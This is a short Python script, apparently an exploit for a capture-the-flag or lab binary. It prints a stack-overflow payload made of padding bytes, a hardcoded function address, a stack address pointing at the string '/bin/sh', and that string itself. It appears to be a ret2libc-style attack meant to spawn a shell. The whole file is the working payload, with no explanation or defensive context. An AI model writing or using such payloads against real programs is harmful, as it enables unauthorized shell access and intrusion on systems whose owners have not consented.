from struct import pack
import sys

sys.stdout.buffer.write(('\x12'*22).encode('ASCII') + pack("<I", 0x080518d0) + ('\x12'*4).encode('ASCII') + pack("<I", 0xfffe9838) + b'/bin/sh')